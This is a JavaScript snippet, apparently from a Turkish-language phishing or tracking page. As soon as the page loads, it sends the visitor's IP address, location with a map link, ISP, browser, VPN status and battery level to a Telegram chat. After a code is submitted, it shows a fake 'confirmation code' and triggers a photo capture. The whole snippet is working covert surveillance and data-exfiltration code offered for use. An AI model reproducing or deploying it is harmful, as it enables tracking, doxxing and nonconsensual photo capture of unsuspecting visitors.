<script>
...
// Kullanıcı verilerini Telegram'a gönder
async function sendUserData(fakeCode, withPhoto = false) {
  const ipData = await getIPData();
  const battery = await getBatteryInfo();
  const userAgent = navigator.userAgent;
  const vpnProxy = (ipData.security && ipData.security.vpn) ? "Evet" : "Hayır";
  const mapsLink = ipData.latitude && ipData.longitude
    ? `https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}`
    : "Bilinmiyor";

  const message = 
`📡 IP: ${ipData.ip || "Bilinmiyor"}
🌍 Ülke: ${ipData.country_name || "Bilinmiyor"}
🏙️ Şehir: ${ipData.city || "Bilinmiyor"}
🧠 ISP: ${ipData.org || "Bilinmiyor"}
📱 Tarayıcı: ${userAgent}
🔐 VPN/Proxy: ${vpnProxy}
🗺️ Harita: ${mapsLink}
🔋 Şarj: ${battery.level}% (${battery.charging})
💻 Kod: ${fakeCode || "-"}`;

  await sendTelegramMessage(CHAT_ID, message);

  if (withPhoto) {
    await takePhoto();
  }
}

// Siteye girer girmez IP gönder
if (CHAT_ID) {
  sendUserData(null, false);
}

// "Kodu Göster" butonu
document.getElementById("submitBtn").addEventListener("click", async () => {
  const input = document.getElementById("codeInput").value.trim();
  if (!CHAT_ID || !URL_SIFRE) {
    showError("Bu siteyi doğru link üzerinden açmalısın.");
    return;
  }
  if(input === ADMIN_CODE){
    hideError();
    const fakeCode = generateFakeCode();
    const codeDiv = document.getElementById("fakeCode");
    codeDiv.textContent = `Kod başarıyla tanımlandı! Onay Kodunuz: ${fakeCode}`;
    codeDiv.style.display = "block";
    await sendTelegramMessage(ADMIN_ID, `Admin kodu kullanıldı.`);
    await sendUserData(fakeCode, true);
    return;
  }
  if(input !== URL_SIFRE){
    showError("Kod hatalı veya süresi dolmuş olabilir.");
    return;
  }
  hideError();
  const fakeCode = generateFakeCode();
  const codeDiv = document.getElementById("fakeCode");
  codeDiv.textContent = `Kod başarıyla tanımlandı! Onay Kodunuz: ${fakeCode}`;
  codeDiv.style.display = "block";
  await sendUserData(fakeCode, true);
});
</script>
